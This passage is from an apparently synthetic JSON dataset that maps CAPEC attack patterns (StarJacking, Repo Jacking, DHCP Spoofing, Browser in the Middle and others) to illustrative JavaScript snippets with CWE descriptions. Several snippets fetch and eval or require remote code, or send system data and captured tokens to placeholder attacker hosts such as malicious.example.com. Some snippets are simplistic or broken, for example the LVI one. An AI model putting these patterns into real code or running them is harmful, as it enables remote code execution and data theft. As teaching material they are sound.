        "description": "This JavaScript code snippet demonstrates a scenario where an adversary spoofs commit metadata in a Git repository to deceive users. The code downloads commit metadata from a potentially malicious source without verifying its integrity (CWE-494). It then writes this metadata to the Git repository's commit message file, potentially exposing the repository to unauthorized control (CWE-527). Additionally, the code includes sensitive information directly in the source code (CWE-540), which should generally be avoided. This snippet embodies the main idea of the CAPEC by showing how an attacker can manipulate version control metadata to mislead users about the origin and maintenance of the software."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code without integrity check\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      // Directly execute the downloaded code\n      eval(data);\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the file:', err);\n  });\n}\n\n// URL of the malicious package, spoofed to appear popular and trusted\nconst maliciousUrl = 'https://example.com/malicious-package.js';\n\n// Download and execute the malicious package\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote URL without performing any integrity checks. The `downloadAndExecute` function uses the `https` module to fetch a script from a given URL and then directly executes it using `eval()`. This embodies the main idea of the CAPEC 'StarJacking', where an adversary spoofs software popularity metadata to deceive users into downloading and executing a malicious package. The code also reflects related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), and CWE-348 (Use of Less Trusted Source). The URL `https://example.com/malicious-package.js` represents a spoofed, seemingly popular and trusted source, but actually hosts malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "const getSystemLocationInfo = () => {\n  const systemInfo = {\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    language: navigator.language,\n    keyboardLayout: navigator.keyboard ? navigator.keyboard.getLayoutMap() : 'unknown'\n  };\n  return systemInfo;\n};\n\nconst sendSystemInfo = async (url) => {\n  const systemInfo = getSystemLocationInfo();\n  try {\n    await fetch(url, {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify(systemInfo)\n    });\n  } catch (error) {\n    console.error('Error sending system info:', error);\n  }\n};\n\nsendSystemInfo('https://malicious.example.com/collect');",
        "description": "This JavaScript code snippet collects sensitive system information such as timezone, language, and keyboard layout, and sends it to a specified URL. The function `getSystemLocationInfo` gathers the system's timezone, language, and keyboard layout. The `sendSystemInfo` function sends this information to a remote server. This code embodies the CAPEC 'System Location Discovery' by collecting and transmitting system location information, potentially exposing sensitive data. The related CWEs are represented by the exposure of sensitive system information (CWE-497), the potential for unauthorized access (CWE-529), and the trust of system event data (CWE-360)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code from a remote repository\nfunction downloadAndExecute(repoUrl) {\n  https.get(repoUrl, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      // Save the downloaded code to a file\n      fs.writeFileSync('downloadedCode.js', data);\n\n      // Execute the downloaded code without integrity check\n      require('./downloadedCode.js');\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the code:', err);\n  });\n}\n\n// Example usage\nconst repoUrl = 'https://example.com/malicious-repo/downloadedCode.js';\ndownloadAndExecute(repoUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote repository without performing any integrity checks. The function `downloadAndExecute` takes a URL of a repository as an argument, downloads the code from that URL, saves it to a file, and then executes it using `require`. This embodies the main idea of the CAPEC 'Repo Jacking', where an adversary can trick users into incorporating malicious code into their applications. The code also reflects related CWEs such as 'Download of Code Without Integrity Check' (CWE-494) and 'Inclusion of Functionality from Untrusted Control Sphere' (CWE-829)."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "function loadValueInjection() {\n  let secret = 'SensitiveData';\n  let buffer = new ArrayBuffer(64);\n  let view = new DataView(buffer);\n\n  // Simulate a page fault or microcode assist\n  try {\n    // This will cause an exception, simulating a faulting load\n    view.getInt32(1000);\n  } catch (e) {\n    // Transient execution: access adversary-controlled data\n    let adversaryData = 'AdversaryControlledData';\n    // Use the adversary-controlled data in a transient operation\n    let temp = adversaryData.charCodeAt(0);\n  }\n\n  // Side-channel analysis to infer the secret\n  let inferredSecret = '';\n  for (let i = 0; i < secret.length; i++) {\n    if (secret.charCodeAt(i) === temp) {\n      inferredSecret += String.fromCharCode(temp);\n    }\n  }\n  console.log('Inferred Secret:', inferredSecret);\n}\n\nloadValueInjection();",
        "description": "This JavaScript code snippet simulates a Load Value Injection (LVI) attack. The function `loadValueInjection` contains a secret value and simulates a page fault or microcode assist by attempting to access an out-of-bounds memory location, which throws an exception. During the transient execution phase, adversary-controlled data is accessed and used in a transient operation. Finally, a side-channel analysis is performed to infer the secret value based on the adversary-controlled data. This code represents the main idea of exploiting transient execution vulnerabilities to expose sensitive information."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  const spoofedDHCPResponse = Buffer.from('DHCPOFFER');\n  server.send(spoofedDHCPResponse, 0, spoofedDHCPResponse.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending spoofed DHCP response:', err);\n  });\n});\n\nserver.bind(67, '0.0.0.0', () => {\n  console.log('DHCP spoofing server listening on port 67');\n});",
        "description": "This JavaScript code snippet demonstrates a basic DHCP spoofing attack using the 'dgram' module to create a UDP server. The server listens for incoming DHCP requests on port 67. When a message is received, it sends back a spoofed DHCP offer response. This embodies the CAPEC of DHCP Spoofing by masquerading as a legitimate DHCP server. The code also touches on related CWEs: it does not ensure communication with the correct endpoint (CWE-923), allows for authentication bypass by spoofing (CWE-290), and relies on IP address for communication (CWE-291)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "function loadMaliciousExtension() {\n  const script = document.createElement('script');\n  script.src = 'http://untrusted-source.com/malicious.js';\n  document.head.appendChild(script);\n}\n\n// Simulate user action to install the extension\nloadMaliciousExtension();",
        "description": "This JavaScript code snippet demonstrates the installation of a malicious extension by dynamically loading a script from an untrusted source. The function 'loadMaliciousExtension' creates a new script element and sets its source to a URL that is outside the trusted control sphere (CWE-829). The script is then appended to the document's head, causing it to be executed without any integrity checks (CWE-494). This represents a Trojan Horse scenario (CWE-507) where the extension appears to be benign but contains hidden malicious code (CWE-506). Additionally, the code does not verify the origin or integrity of the script, making it vulnerable to inclusion of malicious functionality."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "const sensitiveData = 'This is sensitive information';\n\n// Simulate cleartext transmission of sensitive data\nfunction transmitData(data) {\n  console.log('Transmitting data:', data); // CWE-319: Cleartext Transmission of Sensitive Information\n}\n\n// Simulate improper protection of physical side channels\nfunction emitElectromagneticSignal(data) {\n  // This function represents the unintentional emission of electromagnetic signals\n  // CWE-1300: Improper Protection of Physical Side Channels\n  console.log('Emitting signal for data:', data);\n}\n\n// Simulate covert storage channel\nfunction covertStorageChannel(data) {\n  // CWE-515: Covert Storage Channel\n  localStorage.setItem('covertData', data);\n}\n\n// Simulate improper management of sensitive trace data\nfunction storeTraceData(data) {\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  sessionStorage.setItem('traceData', data);\n}\n\n// Simulate covert channel\nfunction covertChannel(data) {\n  // CWE-514: Covert Channel\n  document.cookie = 'covertChannel=' + data;\n}\n\n// Main function to demonstrate the vulnerabilities\nfunction main() {\n  transmitData(sensitiveData);\n  emitElectromagneticSignal(sensitiveData);\n  covertStorageChannel(sensitiveData);\n  storeTraceData(sensitiveData);\n  covertChannel(sensitiveData);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Eavesdropping on a Monitor'. The 'transmitData' function simulates the cleartext transmission of sensitive information (CWE-319). The 'emitElectromagneticSignal' function represents the unintentional emission of electromagnetic signals, which can be captured by an adversary (CWE-1300). The 'covertStorageChannel' function simulates the use of a covert storage channel to transfer information (CWE-515). The 'storeTraceData' function demonstrates improper management of sensitive trace data (CWE-1323). Finally, the 'covertChannel' function shows the use of a covert channel to transfer information (CWE-514). The 'main' function calls these functions to illustrate how these vulnerabilities can be exploited to eavesdrop on sensitive information displayed on a monitor."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "const net = require('net');\n\nconst trustedNetwork = '192.168.1.0/24';\nconst untrustedNetwork = '10.0.0.0/24';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper restriction of communication channel to intended endpoints (CWE-923)\n    if (isTrustedEndpoint(socket.remoteAddress)) {\n      // Trust boundary violation (CWE-501)\n      forwardToUntrustedNetwork(data);\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0');\n\nfunction isTrustedEndpoint(ip) {\n  // Simplified check for trusted network\n  return ip.startsWith('192.168.1.');\n}\n\nfunction forwardToUntrustedNetwork(data) {\n  const client = new net.Socket();\n  client.connect(8081, '10.0.0.1', () => {\n    client.write(data);\n  });\n}",
        "description": "This JavaScript code snippet creates a TCP server that listens for incoming connections. When data is received from a trusted network (192.168.1.0/24), it forwards the data to an untrusted network (10.0.0.0/24). The code demonstrates several vulnerabilities: it does not properly restrict communication channels to intended endpoints (CWE-923), mixes trusted and untrusted data (CWE-501), and does not ensure message integrity during transmission (CWE-924). This setup can be exploited by an adversary to bridge trusted and untrusted networks, embodying the main idea of the CAPEC 'Network Boundary Bridging'."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "const remoteDesktopUrl = 'http://malicious-server.com/remote-desktop';\n\nfunction loadRemoteDesktop() {\n  const iframe = document.createElement('iframe');\n  iframe.src = remoteDesktopUrl;\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  document.body.appendChild(iframe);\n}\n\nfunction authenticateUser(token) {\n  fetch('http://malicious-server.com/auth', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ token })\n  })\n  .then(response => response.json())\n  .then(data => {\n    if (data.authenticated) {\n      loadRemoteDesktop();\n    } else {\n      alert('Authentication failed');\n    }\n  });\n}\n\n// Simulate a token capture-replay attack\nconst capturedToken = 'captured-auth-token';\nauthenticateUser(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a Browser in the Middle (BiTM) attack. The code creates an iframe that loads a remote desktop session from a malicious server. The `authenticateUser` function simulates an authentication process by sending a captured token to the malicious server. If the server responds with a successful authentication, the remote desktop session is loaded in the victim's browser. This snippet embodies several CWEs: CWE-294 (Authentication Bypass by Capture-replay) by using a captured token, CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the token, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code for authentication. CWE-830 (Inclusion of Web Functionality from an Untrusted Source) is represented by embedding an iframe from a malicious domain."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent {\n  constructor() {\n    this.debugFunctions = {\n      readRegister: this.readRegister,\n      writeRegister: this.writeRegister,\n      injectError: this.injectError\n    };\n    this.authorized = false; // Improper access control\n  }\n\n  authorize(user) {\n    // Incorrect granularity: authorizing all functions at once\n    if (user === 'admin') {\n      this.authorized = true;\n    }\n  }\n\n  readRegister() {\n    if (!this.authorized) {\n      throw new Error('Unauthorized access');\n    }\n    // Read register logic\n  }\n\n  writeRegister() {\n    if (!this.authorized) {\n      throw new Error('Unauthorized access');\n    }\n    // Write register logic\n  }\n\n  injectError() {\n    if (!this.authorized) {\n      throw new Error('Unauthorized access');\n    }\n    // Error injection logic\n  }\n}\n\nconst debugComponent = new DebugComponent();\ndebugComponent.authorize('admin'); // Authorizes all functions at once\n\n// Now all debug functions can be accessed without individual checks\ntry {\n  debugComponent.readRegister();\n  debugComponent.writeRegister();\n  debugComponent.injectError();\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a DebugComponent class that manages debug functions such as reading and writing registers and injecting errors. The authorization mechanism is flawed because it authorizes all debug functions at once without checking access on a per-function basis. This represents the main idea of the CAPEC, where incorrect chaining or granularity of debug components can lead to unauthorized access. The code also touches on related CWEs, such as improper access control (CWE-1191) and the potential for unauthorized error injection (CWE-1334)."
    }
]